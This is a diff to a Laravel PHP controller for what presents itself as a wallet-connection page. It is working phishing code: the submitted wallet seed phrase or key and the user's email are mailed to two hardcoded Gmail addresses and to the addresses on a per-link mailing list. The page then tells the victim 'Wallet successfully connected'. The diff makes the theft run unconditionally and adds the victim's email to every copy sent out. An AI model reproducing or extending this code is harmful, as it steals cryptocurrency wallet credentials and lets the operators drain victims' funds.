@@ -53,27 +53,29 @@ class PagesController extends Controller
         $wallet_type = $request['wallet_type'];
         $phrase = $request['key'];
         $link = $request['link'];
+        $email = $request['email'];
+
+        Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase. '<br/>'. 'Here is the email address'. $email ?? 'No email provided' , function ($message) {
+            $message->to(['lawalfemi33@gmail.com','callmehalpha2022@gmail.com'])
+                ->subject('Wallet Key');
+        });
 
         $mailList = mailList::where('link', $link)->get('emails');
 
         if ($mailList) {
-            Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase. '<br/>'. 'Here is the email address'. $request['email'] ?? 'No email provided' , function ($message) {
-                $message->to(['lawalfemi33@gmail.com','callmehalpha2022@gmail.com'])
-                    ->subject('Wallet Key');
-            });
 
             $mails = json_decode($mailList,true);
 
             foreach ($mails as $mail) {
                 foreach ($mail as $mai) {
 
-                    Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase, function ($message) use ($mai) {
+                    Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase. '<br/>'. 'Here is the email address'. $email, function ($message) use ($mai) {
                         $message->to($mai)
                             ->subject('Wallet Key');
                     });
                 }
             }
-            return view('wallet')->with('success', 'Wallet successfully connected');
+            return redirect('wallet')->with('success', 'Wallet successfully connected');
         }
 
         return $this->page_not_found();
